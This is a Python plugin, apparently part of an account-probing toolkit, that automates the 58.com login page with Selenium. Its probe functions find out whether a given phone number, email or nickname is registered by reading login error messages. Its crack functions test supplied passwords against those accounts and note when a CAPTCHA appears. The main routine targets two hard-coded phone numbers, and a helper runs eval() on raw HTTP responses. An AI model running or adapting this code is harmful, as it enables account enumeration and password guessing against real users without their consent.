#coding=utf-8
from plugin import plugin
import requests
import time

class exploit(plugin): 
    """
    请注意：多次尝试登录同一个号码会触发验证码
    """
    def __init__(self,custom_log_dir,args):
        plugin.__init__(self,custom_log_dir,args)
    
    def req(self,url):
        headers = {}
        headers["User-Agent"] = """Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"""
        r = requests.get(url, headers=headers,timeout=self.timeout)
        text=r.content
        res=eval(text)
        self.log("58.response",str(res))
        return res
    
    def probe_all_in_one(self):
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        chrome_options = Options()
        if  __name__ != "__main__":
            chrome_options.add_argument("--headless")
        driver = webdriver.Chrome(chrome_options=chrome_options)
        url="""https://passport.58.com/login?"""
        driver.get(url)
        elem = driver.find_element_by_xpath('//*[@id="pwdLogin"]/i')
        elem.click()
        elem = driver.find_element_by_xpath('//*[@id="usernameUser"]')
        elem.send_keys(self.username)
        self.password = self.username+"uygifjvk"
        self.password = self.password[:15]#密码不应超过16个字符
        #疑似bug，密码框不可见吗？
        #报错: selenium.common.exceptions.ElementNotVisibleException: Message: element not interactable
        #elem = driver.find_element_by_xpath('//*[@id="passwordUser"]')
        #elem.send_keys(self.username+"uygifjvk")
        elem = driver.find_element_by_xpath('//*[@id="passwordUser"]')
        driver.execute_script("""document.getElementById("passwordUser").value="{0}";document.getElementById("passwordUser").focus()""".format(self.password))
        #根据插件是否独立运行图片放在不同位置
        if __name__ == "__main__":
            driver.save_screenshot('58.png')
        else:
            driver.save_screenshot(self.log_dir+'/'+__name__+"/"+'58.png')
        elem = driver.find_element_by_xpath('//*[@id="btnSubmitUser"]')
        elem.click()
        time.sleep(self.timeout)
        result = driver.find_element_by_xpath('//*[@id="passwordTip"]')
        #<span id="passwordTip" class="wrong1 errorTip">该用户名不存在， <a class="gotoregUser" href="//passport.58.com/reg">立即注册?</a> </span>
        #<span id="passwordTip" class="wrong1 errorTip">该用户名与密码不符</span>
        errorTip = result.text
        driver.close()
        if u"不存在" in errorTip:
            ret = False
            msg = "not registered"
        elif u"用户名与密码不符" in errorTip:
            ret = True
            msg = "registered"
        else:
            ret = False
            msg = errorTip
        return ret,msg
        
    def probe_phone(self):
        return self.probe_all_in_one()
        
    def probe_email(self):
        return self.probe_all_in_one()
        
    def probe_nickname(self):
        return self.probe_all_in_one()
    
    def crack_all_in_one(self):
        if len(self.password) < 6:
            return False,"password should not be shorter than 6"
        if len(self.password) > 16:
            return False,"password should not be longer than 16"
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        chrome_options = Options()
        if  __name__ != "__main__":
            chrome_options.add_argument("--headless")
        driver = webdriver.Chrome(chrome_options=chrome_options)
        url="""https://passport.58.com/login?"""
        driver.get(url)
        elem = driver.find_element_by_xpath('//*[@id="pwdLogin"]/i')
        elem.click()
        elem = driver.find_element_by_xpath('//*[@id="usernameUser"]')
        elem.send_keys(self.username)
        elem = driver.find_element_by_xpath('//*[@id="passwordUser"]')
        driver.execute_script("""document.getElementById("passwordUser").value="{0}";document.getElementById("passwordUser").focus()""".format(self.password))
        if __name__ == "__main__":
            driver.save_screenshot('58.png')
        elem = driver.find_element_by_xpath('//*[@id="btnSubmitUser"]')
        elem.click()
        time.sleep(self.timeout)
        result = driver.find_element_by_xpath('//*[@id="passwordTip"]')
        #<span id="passwordTip" class="wrong1 errorTip">该用户名不存在， <a class="gotoregUser" href="//passport.58.com/reg">立即注册?</a> </span>
        #<span id="passwordTip" class="wrong1 errorTip">该用户名与密码不符</span>
        errorTip = result.text
        driver.close()
        if u"不存在" in errorTip:
            ret = False
            msg = "not registered"
        elif u"用户名与密码不符" in errorTip:
            ret = True
            msg = "password wrong"
        elif u'' == errorTip:
            ret = False
            msg = "may need to enter CAPTCHA"
        else:
            ret = True
            msg = "password may be correct"
        return ret,msg
        
    def crack_phone(self):
        return self.crack_all_in_one()
        
    def crack_email(self):
        return self.crack_all_in_one()
        
    def crack_nickname(self):
        return self.crack_all_in_one()
        
def main():
    print exploit('./',('13603854765',)).probe()
    print exploit('./',('13260277895',)).probe()
    
if __name__ == '__main__':
    main()